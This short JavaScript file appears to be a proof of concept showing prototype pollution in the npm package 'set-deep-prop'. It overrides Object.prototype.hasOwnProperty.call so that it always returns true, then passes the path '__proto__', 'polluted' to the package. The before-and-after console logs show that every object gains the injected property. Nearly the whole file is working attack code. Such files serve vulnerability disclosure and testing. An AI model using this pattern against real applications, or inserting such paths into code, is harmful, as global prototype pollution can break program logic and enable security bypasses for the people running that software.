Object.prototype.hasOwnProperty.call = () => true;
const setDeepProp = require('set-deep-prop');
var obj = {};
console.log({}.polluted);
setDeepProp({}, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);